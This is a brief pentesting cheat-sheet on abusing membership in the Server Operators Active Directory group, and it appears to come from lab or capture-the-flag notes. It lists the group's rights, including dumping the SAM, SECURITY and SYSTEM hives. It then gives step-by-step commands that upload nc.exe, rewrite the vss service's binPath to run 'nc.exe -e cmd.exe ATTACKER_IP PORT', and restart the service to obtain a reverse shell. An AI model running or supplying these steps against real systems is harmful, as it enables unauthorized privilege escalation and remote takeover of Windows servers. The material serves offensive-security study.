# Server Operators Active Directory Security Group

### Actions that this group performs:

#### 1) Start and stop services

#### 2) Create and delete network shared resources

#### 3) Backup and Restore files (SAM SECURITY SYSTEM hives dump)

#### 4) Sign in to a server interactively

#### 5) Format the hard disk drive of the computer

#### 6) Shutdown the computer

## Exploitation

### Steps:

## TIP: Upload a nc binary or run a powershell reverse shell if we use evil-winrm

 - Upload a nc binary to target machine (Upload /usr/share/windows-resources/binaries/nc.exe .)

 - sc.exe config vss binPath="C:\temp\nc.exe -e cmd.exe ATTACKER_IP PORT"

 - nc -lvnp PORT (Attacker machine)

 - sc.exe stop vss

 - sc.exe start vss
